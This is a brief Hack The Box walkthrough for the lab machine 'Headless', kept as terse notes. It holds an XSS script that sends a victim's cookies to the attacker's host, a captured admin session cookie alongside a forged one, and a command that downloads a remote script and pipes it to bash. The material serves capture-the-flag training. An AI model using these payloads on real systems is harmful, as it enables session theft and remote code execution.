# HTB Walkthrough — Machine: Headless

**Target IP:** `10.10.11.8`  

**Author:** Miguel Reis  

**Difficulty:** Easy  

**OS:** Linux

![[Headless-20240715221646971.png]]

https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e


```
<script>var i=new Image(); i.src="http://10.10.16.107/?cookie="+btoa(document.cookie);</script>
```


Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs


```
is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
```


```
http://10.10.16.107:8001/payload.sh|bash
```